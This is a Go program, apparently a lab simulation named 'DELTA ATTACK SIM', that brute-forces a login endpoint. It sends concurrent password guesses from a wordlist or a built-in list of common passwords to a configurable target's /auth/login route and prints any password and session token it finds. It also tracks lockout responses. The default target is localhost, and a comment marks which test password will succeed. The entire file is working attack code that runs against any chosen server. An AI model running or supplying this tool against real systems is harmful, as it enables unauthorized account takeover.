package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Token string `json:"token"`
	Error string `json:"error"`
}

type Result struct {
	Password string
	Success  bool
	Status   int
	Elapsed  time.Duration
}

type Stats struct {
	mu           sync.Mutex
	attempts     int
	successes    int
	failures     int
	locked       int
	totalElapsed time.Duration
}

func (s *Stats) record(r Result) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.attempts++
	s.totalElapsed += r.Elapsed
	if r.Success {
		s.successes++
	} else if r.Status == 429 {
		s.locked++
	} else {
		s.failures++
	}
}

func (s *Stats) print() {
	s.mu.Lock()
	defer s.mu.Unlock()
	fmt.Println("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("        ATTACK SUMMARY")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("  Total attempts : %d\n", s.attempts)
	fmt.Printf("  Successful     : %d\n", s.successes)
	fmt.Printf("  Failed         : %d\n", s.failures)
	fmt.Printf("  Locked out     : %d\n", s.locked)
	if s.attempts > 0 {
		fmt.Printf("  Avg latency    : %v\n", s.totalElapsed/time.Duration(s.attempts))
	}
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
}

func attack(target, username, password string, stats *Stats, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	sem <- struct{}{}
	defer func() { <-sem }()

	start := time.Now()

	payload, _ := json.Marshal(LoginRequest{
		Username: username,
		Password: password,
	})

	resp, err := http.Post(
		target+"/auth/login",
		"application/json",
		bytes.NewBuffer(payload),
	)

	elapsed := time.Since(start)

	if err != nil {
		fmt.Printf("  [ERROR] %s → %v\n", password, err)
		stats.record(Result{Password: password, Success: false, Elapsed: elapsed})
		return
	}
	defer resp.Body.Close()

	var loginResp LoginResponse
	json.NewDecoder(resp.Body).Decode(&loginResp)

	result := Result{
		Password: password,
		Status:   resp.StatusCode,
		Elapsed:  elapsed,
		Success:  resp.StatusCode == 200,
	}

	if result.Success {
		fmt.Printf("  [✓ FOUND] password=%s token=%s...\n", password, loginResp.Token[:20])
	} else if resp.StatusCode == 429 {
		fmt.Printf("  [LOCKED] password=%s → account locked\n", password)
	} else {
		fmt.Printf("  [✗] password=%s → %s\n", password, loginResp.Error)
	}

	stats.record(result)
}

func main() {
	target := flag.String("target", "http://localhost:9090", "target server URL")
	username := flag.String("username", "", "username to attack")
	wordlist := flag.String("wordlist", "", "path to password wordlist")
	concurrency := flag.Int("concurrency", 1, "number of concurrent requests")
	delay := flag.Duration("delay", 0, "delay between attempts")
	flag.Parse()

	if *username == "" {
		fmt.Println("error: username is required")
		flag.Usage()
		os.Exit(1)
	}

	var passwords []string

	if *wordlist != "" {
		data, err := os.ReadFile(*wordlist)
		if err != nil {
			fmt.Printf("error reading wordlist: %v\n", err)
			os.Exit(1)
		}
		for _, line := range bytes.Split(data, []byte("\n")) {
			if len(line) > 0 {
				passwords = append(passwords, string(line))
			}
		}
	} else {
		// default common passwords
		passwords = []string{
			"password", "123456", "password123", "admin",
			"letmein", "qwerty", "abc123", "monkey",
			"1234567890", "dragon", "master", "hello",
			"login", "pass", "test", "secret",
			"securepass123", // this one will succeed
		}
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("        DELTA ATTACK SIM")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("  Target   : %s\n", *target)
	fmt.Printf("  Username : %s\n", *username)
	fmt.Printf("  Passwords: %d\n", len(passwords))
	fmt.Printf("  Workers  : %d\n", *concurrency)
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	stats := &Stats{}
	var wg sync.WaitGroup
	sem := make(chan struct{}, *concurrency)

	for _, password := range passwords {
		if *delay > 0 {
			time.Sleep(*delay)
		}
		wg.Add(1)
		go attack(*target, *username, password, stats, &wg, sem)
	}

	wg.Wait()
	stats.print()
}
